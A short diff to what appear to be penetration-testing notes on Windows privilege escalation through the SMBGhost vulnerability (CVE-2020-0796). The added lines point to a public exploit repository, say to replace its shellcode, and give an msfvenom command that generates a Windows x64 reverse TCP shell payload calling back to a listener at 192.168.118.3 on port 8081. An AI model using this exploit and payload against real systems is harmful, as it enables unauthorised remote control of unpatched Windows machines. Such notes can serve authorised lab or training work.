@@ -10,7 +10,9 @@ windows last patched march 2020 or before, you can try SMBGhost vulnerability
 
 ```
 wmic qfe list
-(https://github.com/danigargu/CVE-2020-0796)
+(https://github.com/danigargu/CVE-2020-0796) - Starting with line 204 in
+exploit.cpp, we’ll replace the shellcode with a reverse shell.
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.118.3 LPORT=8081 -f dll -f csharp
 ```
 
 ```
